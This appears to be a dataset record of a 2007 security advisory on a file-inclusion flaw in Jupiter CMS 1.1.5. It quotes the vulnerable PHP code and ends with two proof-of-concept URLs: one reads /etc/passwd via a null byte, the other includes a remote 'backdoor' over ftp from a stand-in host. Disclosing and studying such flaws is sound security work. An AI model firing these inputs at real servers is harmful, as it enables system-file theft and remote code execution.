{
  "id": "3309",
  "title": "Jupiter CMS 1.1.5 - &#039;/index.php&#039; Local/Remote File Inclusion",
  "cve": "CVE-2007-0987",
  "vuln_type": "path_traversal",
  "code": "Title:          Jupiter CMS 1.1.5 Multiple Vulnerabilities\r\nAdvisory ID:    12070214\r\nRisk level:     High\r\nAuthor:         DarkFig <gmdarkfig@gmail.com>\r\nURL:            http://www.acid-root.new.fr/advisories/12070214.txt\r\n\r\nRisk level: High\r\nSummary:    Local/Remote File Inclusion\r\nConditions: LFI: magic_quotes_gpc = Off\r\n            RFI: PHP >= 5.0.0, allow_url_fopen = On\r\n\r\nThe script \"index.php\" contains the following code:\r\n\r\nif(isset($n))\r\n{\r\n  if(file_exists(\"$n.php\"))\r\n  {\r\n    if(strpos($n, \"../\") !== false) header(\"location: $PHP_SELF?i=error\");\r\n    else include(\"$n.php\");\r\n  }\r\n  elseif(!file_exists(\"$n.php\")) header(\"location: $PHP_SELF?i=error\");\r\n}\r\n\r\nThe \"n\" parameter isn't properly filtered, this can lead to file inclusion.\r\nLocal file inclusion will work if magic_quotes_gpc=Off, the null byte char \\x00\r\nis required. Remote file inclusion will work if the server is running on PHP >= 5.\r\nIn this version, the file_exists() function can be used with some URL wrappers,\r\nyou can use ftp:// for example. Simple poc:\r\n\r\nLFI: http://<host><path>/index.php?n=/etc/passwd%00\r\nRFI: http://<host><path>/index.php?n=ftp://user:password@example.com/backdoor\r\n\r\n# milw0rm.com [2007-02-14]",
  "url": "https://www.exploit-db.com/exploits/3309"
}